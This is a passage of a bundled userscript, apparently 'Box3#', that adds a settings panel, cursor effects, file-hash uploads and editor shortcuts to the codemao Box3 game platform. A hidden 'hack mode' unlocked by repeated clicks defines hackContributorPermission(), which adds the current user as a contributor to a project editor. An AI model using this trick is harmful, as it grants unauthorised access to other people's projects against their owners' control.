.5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}');
  })(sweetalert2_all);
  const Swal = sweetalert2_all.exports;
  const defaultConfig = {
    "ui.opacity": 1,
    "ui.width": 400,
    "flag.hackMode": false,
    "ui.primaryColor": "#4174ff",
    "ui.blur": 5,
    "ui.borderRound": true,
    "magicCursor.enable": true,
    "magicCursor.color": "#4174ff",
    "magicCursor.rippleColor": "#42e9ff",
    "magicCursor.opacity": 0.5,
    "ui.windowPos": [0, 0],
    "home.showcaseCols": 4,
    "home.hideCarousel": false
  };
  function startLoading(text = "Please wait...") {
    Swal.fire({
      titleText: "请稍等",
      allowOutsideClick: false,
      text,
      showConfirmButton: false
    });
    Swal.showLoading(null);
    return () => Swal.close();
  }
  function showUploadFile(multiple = false, accept = "") {
    return new Promise((ok) => {
      const result = [];
      const input = document.createElement("input");
      input.type = "file";
      input.accept = accept;
      input.multiple = multiple;
      input.style.opacity = "0";
      document.body.append(input);
      input.click();
      Swal.fire({
        title: "批量上传",
        text: "请选择文件",
        icon: "info",
        showCancelButton: true,
        cancelButtonText: "取消"
      }).then((result2) => {
        if (result2.isDismissed) {
          ok([]);
        }
      });
      Swal.showLoading(null);
      input.addEventListener("change", async () => {
        input.remove();
        for (let i = 0; i < input.files.length; i++) {
          let isRetry = false;
          const file = input.files.item(i);
          if (!file)
            return;
          do {
            try {
              result.push({
                ...await uploadHash(file, file.name),
                filename: file.name
              });
              isRetry = false;
            } catch (e) {
              const res = e;
              await Swal.fire({
                title: `上传失败`,
                text: `${res.status} ${res.statusText}
${await res.text()} 即将重试`,
                timer: 3e3,
                icon: "error"
              });
              isRetry = true;
            }
          } while (isRetry);
        }
        ok(result);
      });
    });
  }
  function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }
  async function uploadHash(data, name = "") {
    const removeLoading = startLoading("正在上传" + name);
    const res = await fetch("https://static.box3.codemao.cn/block", {
      method: "POST",
      body: data
    });
    removeLoading();
    if (res.ok)
      return await res.json();
    else
      throw res;
  }
  async function waitElement(query) {
    let el;
    while (true) {
      el = document.querySelector(query);
      if (el)
        return el;
      await new Promise(requestAnimationFrame);
    }
  }
  async function waitUntil(f) {
    while (!f())
      await new Promise(requestAnimationFrame);
  }
  let settings = {
    ...defaultConfig,
    ...GM_getValue("settings", {})
  };
  function getSetting(k) {
    return { ...settings }[k];
  }
  function setSetting(k, v) {
    Object.assign(settings, { [k]: v });
    saveSettings();
  }
  function saveSettings() {
    GM_setValue("settings", settings);
  }
  function resetSettings() {
    GM_setValue("settings", defaultConfig);
    location.reload();
  }
  function reloadSettings() {
    settings = GM_getValue("settings", defaultConfig);
  }
  function addFunctionButton(gui2, func, name) {
    const btn = gui2.add(
      {
        func: () => {
          btn.name("⏳ 正在执行操作...");
          btn.disable();
          func().then(() => {
            btn.name(name);
            btn.enable();
          });
        }
      },
      "func"
    ).name(name);
  }
  function addLabel(gui2, name) {
    const btn = gui2.add(
      {
        func: () => {
        }
      },
      "func"
    ).name(name);
    btn.disable();
    return btn;
  }
  function setupMagicCursor() {
    Promise.resolve().then(() => magicCursorStyle$1);
    function addStyle() {
      const style = document.createElement("style");
      style.textContent = "*{cursor:none !important;}";
      document.body.appendChild(style);
    }
    addStyle();
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    let mousePos = [0, 0];
    let pos = [0, 0];
    const MAX_LENGTH = 30;
    let points = [];
    const ripples = [];
    function resize() {
      canvas.height = innerHeight * devicePixelRatio;
      canvas.width = innerWidth * devicePixelRatio;
    }
    addEventListener("resize", resize);
    document.body.addEventListener("mousemove", ({ clientX, clientY }) => {
      mousePos = [clientX * devicePixelRatio, clientY * devicePixelRatio];
    });
    addEventListener("mousedown", () => {
      ripples.push([...mousePos, 0]);
    });
    addEventListener("wheel", ({ deltaY }) => {
      pos[1] -= deltaY * 0.1;
    });
    resize();
    canvas.classList.add("magic-cursor-canvas");
    document.body.append(canvas);
    function frame() {
      if (document.pointerLockElement) {
        canvas.style.opacity = "0";
        mousePos = [
          innerWidth * devicePixelRatio / 2,
          innerHeight * devicePixelRatio / 2
        ];
      } else {
        canvas.style.opacity = settings["magicCursor.opacity"].toString();
      }
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      requestAnimationFrame(frame);
      pos[0] += (mousePos[0] - pos[0]) / 5;
      pos[1] += (mousePos[1] - pos[1]) / 5;
      ctx.lineJoin = "round";
      ctx.lineCap = "round";
      for (let i = 0; i < points.length; i++) {
        const a = i / MAX_LENGTH;
        ctx.beginPath();
        if (i > 0)
          ctx.moveTo(points[i - 1][0], points[i - 1][1]);
        ctx.lineTo(points[i][0], points[i][1]);
        ctx.strokeStyle = `${settings["magicCursor.color"]}${Math.round(a * 255).toString(16).padStart(2, "0")}`;
        ctx.lineWidth = a * 20;
        ctx.closePath();
        ctx.stroke();
      }
      for (let r of ripples) {
        ctx.beginPath();
        ctx.arc(r[0], r[1], r[2] * 30, 0, Math.PI * 2);
        ctx.fillStyle = `${settings["magicCursor.rippleColor"]}${Math.round(
          (1 - r[2]) * 255
        ).toString(16).padStart(2, "0")}`;
        ctx.closePath();
        ctx.fill();
        r[2] += (1 - r[2]) / 10;
      }
      for (let i = 0; i < ripples.length; i++) {
        if (ripples[i][2] >= 0.999)
          ripples.splice(i, 1);
      }
      ctx.closePath();
      points.push([...pos]);
      ctx.beginPath();
      ctx.arc(mousePos[0], mousePos[1], 3, 0, Math.PI * 2);
      ctx.fillStyle = settings["magicCursor.rippleColor"];
      ctx.closePath();
      ctx.fill();
      while (points.length > MAX_LENGTH) {
        points.splice(0, 1);
      }
    }
    frame();
  }
  function HashTools(gui2) {
    const f = gui2.addFolder("Hash工具");
    f.close();
    addFunctionButton(
      f,
      async () => {
        const input = document.createElement("input");
        input.type = "file";
        input.style.opacity = "0";
        document.body.append(input);
        input.click();
        input.addEventListener("change", async () => {
          const file = input.files[0];
          input.remove();
          if (!file)
            return;
          try {
            const obj = await uploadHash(file);
            navigator.clipboard.writeText(obj.Key);
            if ((await Swal.fire({
              title: "上传完成",
              html: `HashKey: ${obj.Key}<br/>大小: ${obj.Size}<br/>已将Hash复制到剪贴板`,
              cancelButtonText: "关闭",
              confirmButtonText: "打开Hash链接",
              showCancelButton: true,
              icon: "info"
            })).isConfirmed)
              open(`https://static.box3.codemao.cn/block/${obj.Key}`);
          } catch (e) {
            const res = e;
            Swal.fire(
              `上传失败`,
              `${res.status} ${res.statusText}
${await res.text()}`,
              "error"
            );
          }
        });
      },
      "上传文件"
    );
    const f2 = f.addFolder("打开Hash");
    addFunctionButton(
      f2,
      async () => {
        const text = (await navigator.clipboard.readText()).trim();
        if (!/^Qm[a-zA-Z0-9]+$/.test(text))
          return Swal.fire(
            "Hash无效",
            `剪贴板中的内容并不是一个有效的hash`,
            "error"
          );
        open(`https://static.box3.codemao.cn/block/${text}`);
        return;
      },
      "打开剪贴板中的hash"
    );
  }
  function updateUIProperty() {
    const element = document.querySelector(".lil-gui.root");
    element.style.opacity = settings["ui.opacity"].toString();
    element.style.width = settings["ui.width"].toString() + "px";
    element.style.setProperty("--primary-color", settings["ui.primaryColor"]);
    element.style.setProperty(
      "--border-radius",
      settings["ui.borderRound"] ? "5px" : "0"
    );
    element.style.setProperty("--blur", settings["ui.blur"].toString() + "px");
    element.style.setProperty("--primary-color", settings["ui.primaryColor"]);
    element.style.setProperty("--primary-color", settings["ui.primaryColor"]);
  }
  function Box3SharpConfig(gui2) {
    updateUIProperty();
    const f = gui2.addFolder("Box3#设置");
    f.close();
    let enableHackClickCount = 0;
    if (!getSetting("flag.hackMode"))
      f.add(
        {
          async f() {
            enableHackClickCount++;
            if (enableHackClickCount == 10) {
              if ((await Swal.fire({
                title: "Enable Hack Mode",
                text: "启用后所造成的一切后果均需要自行承担",
                icon: "warning",
                showConfirmButton: true,
                showCancelButton: true,
                confirmButtonText: "Enable and reload",
                cancelButtonText: "取消"
              })).isConfirmed) {
                setSetting("flag.hackMode", true);
                location.reload();
              } else
                enableHackClickCount = 0;
            }
          }
        },
        "f"
      ).name("▰▰▰ Box3 Sharp ▰▰▰");
    else
      f.add(
        {
          f() {
            setSetting("flag.hackMode", false);
            location.reload();
          }
        },
        "f"
      ).name("Disable Hack Mode");
    f.add(settings, "ui.opacity", 0.1, 1).name("UI透明度").onChange(updateUIProperty);
    f.add(settings, "ui.width", 200, 800).name("UI宽度").onFinishChange(updateUIProperty);
    f.addColor(settings, "ui.primaryColor").name("主题颜色").onChange(updateUIProperty);
    f.add(settings, "ui.blur", 0, 10).name("背景模糊度").onChange(updateUIProperty);
    f.add(settings, "ui.borderRound").name("控件圆角").onFinishChange(updateUIProperty);
    const mcf = f.addFolder("鼠标特效");
    mcf.add(settings, "magicCursor.enable").name("启用鼠标特效（需要刷新）");
    mcf.addColor(settings, "magicCursor.color").name("光标拖尾颜色");
    mcf.addColor(settings, "magicCursor.rippleColor").name("波纹颜色");
    mcf.add(settings, "magicCursor.opacity", 0.1, 1).name("图层透明度");
    addFunctionButton(
      f,
      async () => {
        saveSettings();
        location.reload();
      },
      "保存并刷新"
    );
    addFunctionButton(
      f,
      async () => {
        reloadSettings();
        location.reload();
      },
      "不保存并刷新"
    );
    addFunctionButton(
      f,
      async () => {
        resetSettings();
      },
      "还原为默认值"
    );
  }
  const global$1 = "";
  const guiOverride = "";
  const swalOverride = "";
  let gui;
  let containerWindowElement = document.createElement("div");
  document.body.append(containerWindowElement);
  let dragHandle = document.createElement("div");
  let windowPos = [...settings["ui.windowPos"]];
  containerWindowElement.append(dragHandle);
  let isPlaneDragging = false;
  containerWindowElement.classList.add("container-window");
  dragHandle.classList.add("handle");
  dragHandle.textContent = "拖动以移动窗口";
  dragHandle.addEventListener("mousedown", () => isPlaneDragging = true);
  function updateWindowPosition() {
    containerWindowElement.style.left = ~~windowPos[0] + "px";
    containerWindowElement.style.top = ~~windowPos[1] + "px";
  }
  updateWindowPosition();
  addEventListener("mousemove", ({ movementX, movementY }) => {
    if (isPlaneDragging) {
      windowPos[0] += movementX * (1 / devicePixelRatio);
      windowPos[1] += movementY * (1 / devicePixelRatio);
      updateWindowPosition();
    }
  });
  addEventListener("mouseup", () => {
    isPlaneDragging = false;
    if (windowPos[1] < 0)
      windowPos[1] = 0;
    if (windowPos[0] < 0)
      windowPos[0] = 0;
    if (windowPos[1] > innerHeight - 50)
      windowPos[1] = innerHeight - 50;
    if (windowPos[0] > innerWidth - settings["ui.width"])
      windowPos[0] = innerWidth - settings["ui.width"];
    settings["ui.windowPos"] = [...windowPos];
    saveSettings();
    updateWindowPosition();
  });
  function main() {
    gui = new GUI({ width: 400, autoPlace: false });
    containerWindowElement.append(gui.domElement);
    gui.title(`Box3# v${GM_info.script.version} by AlanBestHacker`);
    console.log(GM_info);
    addFunctionButton(
      gui,
      async () => {
        GM_openInTab(
          GM_info.script.homepageURL || "https://greasyfork.org/zh-CN/scripts/456978-box3-sharp"
        );
      },
      "手动更新"
    );
    async function matchModule() {
      const matches = {
        "box3.fun": "Box3Fun",
        "/me/content($|.+map)": "MapContent",
        "/p/": "Play",
        "/e/": "Editor",
        "box3.codemao.cn/($|.filter.+)": "Home"
      };
      for (let r of Object.keys(matches)) {
        if (new RegExp(r).test(location.href)) {
          try {
            const func = (await __variableDynamicImportRuntimeHelper(/* @__PURE__ */ Object.assign({ "./modules/Box3Fun.ts": () => Promise.resolve().then(() => Box3Fun$1), "./modules/Editor.ts": () => Promise.resolve().then(() => Editor$1), "./modules/Home.ts": () => Promise.resolve().then(() => Home$1), "./modules/MapContent.ts": () => Promise.resolve().then(() => MapContent$1), "./modules/Play.ts": () => Promise.resolve().then(() => Play$1) }), `./modules/${matches[r]}.ts`)).default;
            func(gui);
          } catch (e) {
            addLabel(gui, `❌ 模块 ${matches[r]} 加载失败`);
            console.error(e);
          }
        }
      }
    }
    matchModule();
    HashTools(gui);
    Box3SharpConfig(gui);
  }
  let lastHref = "";
  setInterval(() => {
    if (location.href != lastHref) {
      lastHref = location.href;
      if (gui)
        gui.destroy();
      main();
    }
  }, 100);
  if (settings["magicCursor.enable"])
    setupMagicCursor();
  const magicCursorStyle = "canvas.magic-cursor-canvas {\n  height: 100vh;\n  width: 100vw;\n  position: fixed;\n  top: 0;\n  left: 0;\n  z-index: 9999999999;\n  opacity: 0.5;\n  pointer-events: none;\n  transition: opacity 0.25s;\n}\n";
  const magicCursorStyle$1 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
    __proto__: null,
    default: magicCursorStyle
  }, Symbol.toStringTag, { value: "Module" }));
  function Box3Fun(gui2) {
    addFunctionButton(
      gui2,
      async () => {
        startLoading();
        location.href = "https://box3.codemao.cn";
      },
      "跳转到box3.codemao.cn"
    );
    addFunctionButton(
      gui2,
      async () => {
        location.href = "/admin";
      },
      "进入后台（仅限官方）"
    );
  }
  const Box3Fun$1 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
    __proto__: null,
    default: Box3Fun
  }, Symbol.toStringTag, { value: "Module" }));
  function GraphicSettings(getCore, state, gui2, needSetSettings = true) {
    const settingsFolder = gui2.addFolder("🎮 高级画质设定").close();
    var VFXSettingsFolder = settingsFolder.addFolder("📈 视觉&性能").close();
    var particleSettingsFolder = settingsFolder.addFolder("💻 后处理特效").close();
    var postProcessSettingsFolder = settingsFolder.addFolder("🎵 音量合成器").close();
    var cameraSettingsFolder = settingsFolder.addFolder("📷 摄像机控制").close();
    var SFXSettingsFolder = settingsFolder.addFolder("✨ 实体粒子数量").close();
    var graphicSettings = state.box3.state.settings;
    [
      VFXSettingsFolder.add(graphicSettings, "resolutionScale", {
        极低: 0.1,
        非常低: 0.2,
        低: 0.3,
        中: 0.5,
        高: 0.7,
        较高: 0.8,
        全高清: 1,
        "超采样（1.1x）": 1.1,
        "超采样（1.25x）": 1.25,
        "超采样（1.5x）": 1.5,
        "超采样（2.0x）": 2,
        "超采样（2.5x）": 2.5,
        "超采样（3.0x）": 3,
        "超采样（4.0x）": 4
      }).name("清晰度（重进生效）"),
      VFXSettingsFolder.add(
        graphicSettings,
        "animationQuality",
        {
          低: 0,
          中: 100,
          高: 200
        },
        1
      ).name("动画质量"),
      VFXSettingsFolder.add(graphicSettings, "drawDistance", {
        非常近: 16,
        近: 32,
        中: 64,
        远: 128,
        较远: 256,
        非常远: 512,
        极远: 1024,
        荒唐: 2048,
        疯狂: 4096
      }).name("视野距离"),
      VFXSettingsFolder.add(
        graphicSettings,
        "cameraSensitivity",
        0.01,
        3,
        0.01
      ).name("视角灵敏度"),
      VFXSettingsFolder.add(graphicSettings, "safeShaders").name(
        "安全光影（追求极致效果请关闭）"
      ),
      VFXSettingsFolder.add(graphicSettings, "shadowResolution", {
        关闭: 0,
        极低: 128,
        低: 512,
        中: 1024,
        高: 2048,
        非常高: 4096
      }).name("阴影质量"),
      VFXSettingsFolder.add(graphicSettings, "gamma", 0, 2).name("伽马"),
      VFXSettingsFolder.add(graphicSettings, "lowQualityTextures").name(
        "低质量贴图"
      ),
      VFXSettingsFolder.add(graphicSettings, "hdSky").name("高清天空"),
      VFXSettingsFolder.add(graphicSettings, "reflections").name("反射模式"),
      VFXSettingsFolder.add(graphicSettings, "parallaxMap").name("视差贴图"),
      VFXSettingsFolder.add(
        graphicSettings,
        "parallaxDistance",
        1,
        128,
        0.1
      ).name("视差距离"),
      particleSettingsFolder.add(graphicSettings, "postprocess").name("启用后处理特效"),
      particleSettingsFolder.add(graphicSettings, "depthOfField", {
        关闭: 0,
        低: 16,
        中: 32,
        高: 64,
        散光: 128
      }).name("景深强度"),
      particleSettingsFolder.add(graphicSettings, "volumetricScattering").name("体积散射"),
      particleSettingsFolder.add(graphicSettings, "bloom").name("荧光特效"),
      particleSettingsFolder.add(graphicSettings, "fxaa").name("FXAA抗锯齿"),
      postProcessSettingsFolder.add(graphicSettings, "masterMute").name("主音量静音"),
      postProcessSettingsFolder.add(graphicSettings, "masterVolume", 0, 1, 0.01).name("主音量大小"),
      postProcessSettingsFolder.add(graphicSettings, "effectsMute").name("音效静音"),
      postProcessSettingsFolder.add(graphicSettings, "effectsVolume", 0, 1).name("音效音量"),
      postProcessSettingsFolder.add(graphicSettings, "maxSoundEffects", 0, 100, 1).name("最大音效数量"),
      postProcessSettingsFolder.add(graphicSettings, "uiMute").name("界面音效静音"),
      postProcessSettingsFolder.add(graphicSettings, "uiVolume", 0, 1, 0.01).name("界面音效音量"),
      postProcessSettingsFolder.add(graphicSettings, "musicMute").name("背景音乐静音"),
      postProcessSettingsFolder.add(graphicSettings, "musicVolume", 0, 1, 0.01).name("背景音乐音量"),
      SFXSettingsFolder.add(graphicSettings, "maxParticles", 0, 131052, 1).name(
        "最大粒子数量"
      ),
      SFXSettingsFolder.add(
        graphicSettings,
        "maxParticleGroups",
        0,
        1024,
        1
      ).name("最大粒子组数量")
    ].forEach(
      (i) => i.onChange(() => {
        if (needSetSettings)
          getCore().setGameSettings(graphicSettings);
      })
    );
    cameraSettingsFolder.add(state.box3.state.secret.replica.camera, "distance", 0, 300).name("摄像机距离");
    cameraSettingsFolder.add(state.box3.state.secret.replica.camera, "fovY", 0, 1).name("FovY");
    cameraSettingsFolder.add(state.box3.state.secret.replica.camera, "mode", {
      "第三人称(FOLLOW)": 0,
      "锁定(FIXED)": 1,
      "第一人称(FPS)": 2,
      固定方向: 3
    }).name("相机模式");
    cameraSettingsFolder.add(state.box3.state.secret.replica, "enableCursor").name("启用3D光标");
    cameraSettingsFolder.add(state.box3.state, "hideUI").name("隐藏界面");
    cameraSettingsFolder.add({ a: 0 }, "a", { 视角锁定: 0, 右键拖动: 1 }).name("相机操作模式").onChange((v) => {
      state.box3.input.setCameraBindingMode(v);
    });
  }
  async function Editor(gui2) {
    const f = gui2.addFolder("编辑器工具");
    const btn = f.add({ a() {
    } }, "a").name("等待进入地图").disable();
    const rootElement = await waitElement("#edit-react");
    function getCore() {
      return rootElement._reactRootContainer._internalRoot.current.updateQueue.baseState.element.props.children.props.children.props;
    }
    await waitUntil(
      () => {
        var _a, _b, _c, _d;
        return !getCore().onStart && ((_d = (_c = (_b = (_a = getCore()) == null ? void 0 : _a.state) == null ? void 0 : _b.box3) == null ? void 0 : _c.state) == null ? void 0 : _d.appState) == 2;
      }
    );
    const core = getCore();
    btn.destroy();
    function place(gui22, obj) {
      for (let k of Object.keys(obj)) {
        const v = obj[k];
        if (typeof v === "object") {
          const f2 = gui22.addFolder(k);
          place(f2, v);
        } else if (typeof v === "string") {
          addFunctionButton(gui22, async () => getCore().scriptEval(v), k);
        }
      }
    }
    if (getSetting("flag.hackMode"))
      Object.assign(window, { core });
    place(f, {
      编辑器常用控制台代码: {
        移动: {
          所有玩家返回重生点: `world.querySelectorAll("player").forEach(e=>e.player.forceRespawn())`,
          切换幽灵模式: `world.querySelectorAll("player").forEach(e=>e.player.spectator=!e.player.spectator)`,
          切换飞行模式: `world.querySelectorAll("player").forEach(e=>e.player.canFly=!e.player.canFly)`,
          提高飞行速度: `world.querySelectorAll("player").forEach(e=>e.player.flySpeed*=2)`,
          降低飞行速度: `world.querySelectorAll("player").forEach(e=>e.player.flySpeed/=2)`
        }
      }
    });
    addFunctionButton(
      f,
      async () => {
        const done = startLoading();
        await core.editReplica.stopProject();
        await core.editReplica.startProject();
        done();
      },
      "停止代码并重新开始"
    );
    addFunctionButton(
      f,
      async () => {
        if ((await Swal.fire({
          title: "重启编辑端",
          text: "重启编辑端将会踢出所有玩家并停止编辑器中所有代码，再次启动需要更长时间。仅应用于编辑器卡住等特殊情况，请勿用于恶意用途（重启编辑器需要大约半分钟）",
          confirmButtonText: "确认重启",
          confirmButtonColor: "red",
          showCancelButton: true,
          cancelButtonText: "取消"
        })).isConfirmed) {
          startLoading("正在重启");
          await sleep(2e4);
          core.editReplica.restart();
          location.reload();
        }
      },
      "重启编辑端"
    );
    addFunctionButton(
      f,
      async () => {
        const fileList = await showUploadFile(true, "text/javascript");
        for (let file of fileList) {
          core.assetController.copyAsset(file.filename, {
            contentId: 0,
            hash: file.Key,
            ownerId: 0,
            previewImage: "",
            size: file.Size,
            type: 1
          });
        }
        Swal.fire(
          "批量导入完成",
          `已成功导入${fileList.length}个脚本文件`,
          "success"
        );
      },
      "批量上传脚本"
    );
    addFunctionButton(
      f,
      async () => {
        const fileList = await showUploadFile(true, "audio/*");
        for (let file of fileList) {
          core.assetController.copyAsset(file.filename, {
            contentId: 0,
            hash: file.Key,
            ownerId: 0,
            previewImage: "",
            size: file.Size,
            type: 6
          });
        }
        Swal.fire(
          "批量导入完成",
          `已成功导入${fileList.length}个音频文件`,
          "success"
        );
      },
      "批量上传音频"
    );
    const state = getCore().state;
    GraphicSettings(getCore, state, f, false);
    if (settings["flag.hackMode"]) {
      Object.assign(unsafeWindow, {
        hackContributorPermission() {
          getCore().permissionController.addCollaborator(
            getCore().state.box3.state.secret.userId,
            "contributor"
          );
          Swal.fire(
            "Hack Permission",
            "Got contributor permission (depend on owner's config for contributor group)",
            "success"
          );
        }
      });
    }
  }
  const Editor$1 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
    __proto__: null,
    default: Editor
  }, Symbol.toStringTag, { value: "Module" }));
  function Home(gui2) {
    const f = gui2.addFolder("首页优化");
    const overrideStyle = document.createElement("style");
    document.body.append(overrideStyle);
    function updateConfig() {
      overrideStyle.textContent = `
    ._2p590X3xza5oTJJZ3ToFcx ._1yZ6NeMjfGScb4F10xmspg{
      width: calc(${100 / settings["home.showcaseCols"]}% - 16px)
    }
    ${settings["home.hideCarousel"] ? `
    main > div._2PcVy2PEDRfz4Up6wcJEyU > div > div > div._12-esTLCDOtIXa8nIbuTtV{
      display: none
    }
    ` : ""}
    
    `;
    }
    updateConfig();
    f.add(settings, "home.showcaseCols", 2, 10, 1).name("每行展示作品个数");
    f.add(settings, "home.hideCarousel").name("隐藏轮播图");
    f.children.forEach(
      (child) => child.onFinishChange(saveSettings).onChange(updateConfig)
    );
  }
  const Home$1 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
    __proto__: null,
    default: Home
  }, Symbol.toStringTag, { value: "Module" }));
  function _CustomMap(gui2) {
    const f = gui2.addFolder("自定义地图参数");
